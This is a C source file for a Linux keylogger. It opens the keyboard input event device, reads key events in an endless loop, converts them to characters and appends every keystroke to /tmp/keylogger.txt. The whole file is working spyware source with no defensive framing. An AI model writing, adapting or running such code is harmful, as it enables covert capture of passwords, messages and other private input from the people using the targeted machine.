#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>

#include "device-reader.h"
#include "input-event-codes.h"

int main()
{

    char buf[30] = "";
    int fdKeyboard = -1;
    FILE *fdStorage = NULL;
    ssize_t len = 0;
    struct input_event ie = {};
    int i = 0;


    get_keyboard_event(buf, 30);


    if ((fdKeyboard = open(buf, O_RDONLY)) == -1) {
        fprintf(stderr, "Unable to open keyboard event file at %s", buf);
        exit(EXIT_FAILURE);
    }
    if ((fdStorage = fopen("/tmp/keylogger.txt", "a")) == NULL) {
        fprintf(stderr, "Unable to create /tmp/keylogger.txt file");
        close(fdKeyboard);
        exit(EXIT_FAILURE);
    }

    for (i = 0;; ++i) {
        len = read(fdKeyboard, &ie, sizeof(ie));
        if (ie.value == EV_KEY) {
            char tmp = input_event_to_ascii(ie);
            if (tmp != '-') {
                fprintf(fdStorage, "%c", tmp);
                fflush(fdStorage);
            }
        }
    }

    close(fdKeyboard);
    fclose(fdStorage);

    return EXIT_SUCCESS;
}